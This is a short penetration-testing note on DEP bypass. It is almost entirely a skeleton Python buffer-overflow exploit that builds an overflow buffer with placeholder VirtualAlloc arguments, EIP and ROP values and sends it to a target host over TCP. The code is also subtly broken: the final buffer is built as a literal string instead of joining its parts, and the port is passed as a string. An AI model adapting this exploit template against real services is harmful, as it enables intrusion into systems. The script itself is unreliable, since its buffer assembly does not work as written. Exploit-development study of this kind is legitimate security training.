# DEP Bypass

### 1. Skeleton python code
```
import socket
import sys
from struct import pack

# variables
SIZE = 500

# CommandBuffer
# These lines execute VirtualAlloc with shellcode
va  = pack("<L", (0x45454545)) # dummy VirtualAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize 
va += pack("<L", (0x49494949)) # # dummy flAllocationType 
va += pack("<L", (0x51515151)) # dummy flProtect

# buffer
offset = b'\x41' * SIZE
eip = b'\x42' * 4
rop = b'\x43' * (0x600 - SIZE - len(eip))

buf = b'offset + va + eip + rop'
print('[I] %s : %s' % (len(buf),buf))

def main():
  if len(sys.argv) != 3:
    print('Usage: %s <ip_address> <port>\n' % (sys.argv[0]))
    sys.exit(1)

  server = sys.argv[1]
  port = sys.argv[2]
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  
  s.send(buf)
  s.close()

  print('[+] Packet sent')
  sys.exit()

if __name__ == '__main__':
  main()
```

## 2. Find Bad Characters 
[Finding Bad Characters](https://github.com/cyberheisen/Penetration-Testing-Notes/blob/main/exploit_dev/identifying_bad_characters.md)
